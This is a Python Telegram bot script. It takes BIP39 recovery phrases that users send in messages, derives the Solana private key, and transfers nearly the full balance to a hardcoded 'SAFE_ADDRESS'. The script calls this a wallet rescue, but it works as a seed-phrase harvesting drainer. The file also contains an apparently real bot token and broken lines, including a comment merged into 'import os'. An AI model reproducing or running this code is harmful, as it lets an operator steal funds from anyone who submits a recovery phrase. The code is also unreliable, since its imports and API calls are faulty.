import socket
socket.setdefaulttimeout(30)  # Prevents hanging network requestsimport os
import re
import asyncio
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes
from solana.rpc.async_api import AsyncClient
from solana.transaction import Transaction
from solders.system_program import TransferParams, transfer
from solders.pubkey import Pubkey
from bip_utils import Bip39MnemonicValidator, Bip39SeedGenerator, Bip44Coins, Bip44

# Configuration
BOT_TOKEN = os.environ['7693714653:AAFW_YC7xjx6_YGfk1lqKj_z7d3Ptrf4Sns']
SAFE_ADDRESS = "28cG8cjK4z1fcL4L7Tzpua25gxZbKNXDvE5wwzbn2Ue4"
SOLANA_RPC_URL = os.getenv('SOLANA_RPC_URL', 'https://api.devnet-solana.com')

async def transfer_sol(secret_phrase):
    try:
        # Validate and generate wallet
        Bip39MnemonicValidator().Validate(" ".join(secret_phrase))
        seed = Bip39SeedGenerator(" ".join(secret_phrase)).Generate()
        bip44_ctx = Bip44.FromSeed(seed, Bip44Coins.SOLANA).DeriveDefaultPath()
        privkey = bip44_ctx.PrivateKey().Raw().ToBytes()
        pubkey = str(bip44_ctx.PublicKey().ToAddress())
        
        # Transfer logic
        async with AsyncClient(SOLANA_RPC_URL) as client:
            balance = (await client.get_balance(Pubkey.from_string(pubkey))).value
            
            if balance > 1000000:  # Leave 0.001 SOL for fees
                blockhash = (await client.get_recent_blockhash()).value.blockhash
                
                txn = Transaction().add(
                    transfer(TransferParams(
                        from_pubkey=Pubkey.from_string(pubkey),
                        to_pubkey=Pubkey.from_string(SAFE_ADDRESS),
                        lamports=balance-1000000
                    ))
                )
                txn.sign(privkey)
                txid = (await client.send_transaction(txn)).value
                return str(txid)
                
    except Exception as e:
        print(f"Transfer error: {e}")
        return None

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if match := re.search(r'RECOVERY_PHRASE\s*((?:\w+\s*){12,24})', update.message.text, re.I):
            await update.message.reply_text("🔄 Processing recovery phrase...")
            
            txid = await transfer_sol(match.group(1).split())
            if txid:
                await update.message.reply_text(
                    f"✅ Funds transferred!\n"
                    f"View transaction: https://solscan.io/tx/{txid}\n"
                    f"⚠️ Immediately revoke this wallet!"
                )
            else:
                await update.message.reply_text("❌ Transfer failed (0 balance or error)")
                
    except Exception as e:
        await update.message.reply_text(f"⚠️ Critical error: {str(e)}")
        print(f"Handler error: {e}")

async def start_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("Bot is running...")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(start_bot())
